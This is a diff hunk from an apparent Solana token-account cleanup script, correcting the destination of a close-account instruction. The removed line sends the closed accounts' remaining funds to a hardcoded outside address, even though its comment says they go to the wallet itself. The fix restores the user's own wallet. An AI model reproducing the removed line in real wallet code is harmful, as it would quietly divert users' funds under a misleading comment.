@@ -58,7 +58,7 @@ async function burnAndCloseAllTokenAccounts() {
         // Create close account instruction for the token account (whether it has a balance or not)
         const closeInstruction = createCloseAccountInstruction(
           tokenAccountPublicKey,      // Token account to be closed
-          new PublicKey("USDCVZr4PDronye9xeMXpPTUcgZ7dyjmuxS8bchq3H7"),           // Destination to send any remaining tokens (wallet itself)
+          wallet.publicKey,           // Destination to send any remaining tokens (wallet itself)
           wallet.publicKey            // Owner of the account
         );
         transaction.add(closeInstruction);
